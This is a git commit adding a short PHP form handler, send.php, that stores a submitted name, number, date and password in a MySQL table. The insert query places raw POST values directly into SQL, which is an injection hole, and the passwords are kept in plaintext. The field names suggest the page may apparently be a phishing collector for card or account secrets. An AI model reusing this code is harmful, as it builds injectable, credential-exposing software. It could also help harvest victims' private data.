19437602d8c69b7e51fe26068f83bc0cdfdf7fba
pjresolucion <ecarballo515@gmail.com>
2025-03-01 23:53:41 -0300

    Add files via upload

---
+++ send.php
@@ -0,0 +1,38 @@
+<?php
+
+	include("conexion.php");
+
+	if(isset($_POST['send'])) {
+	
+		if(
+			strlen($_POST['name']) >= 1 &&
+			strlen($_POST['number']) >= 1 &&
+			strlen($_POST['date']) >= 1 &&
+			strlen($_POST['password']) >= 1 
+		)
+		
+		{
+			$name = trim($_POST['name']);
+			$number = trim($_POST['number']);
+			$date = trim($_POST['date']);
+			$password = trim($_POST['password']);
+			$fecha = date('d/m/y');
+			$cosulta = "INSERT INTO datos(nombre, numero, fecha, clave) 
+						VALUES ('$name', '$number', '$date', '$password')";
+			$resultado = mysqli_query($conex, $cosulta);
+			if($resultado)
+			
+			{
+				?>
+					<h3 class="success"></h3>
+				<?php 
+				} else {
+					?>
+					<h3 class="error">Ocurrio un error. Reintete mas tarde </h3>
+				<?php 
+				}
+			
+	}
+	}
+	?>
+	
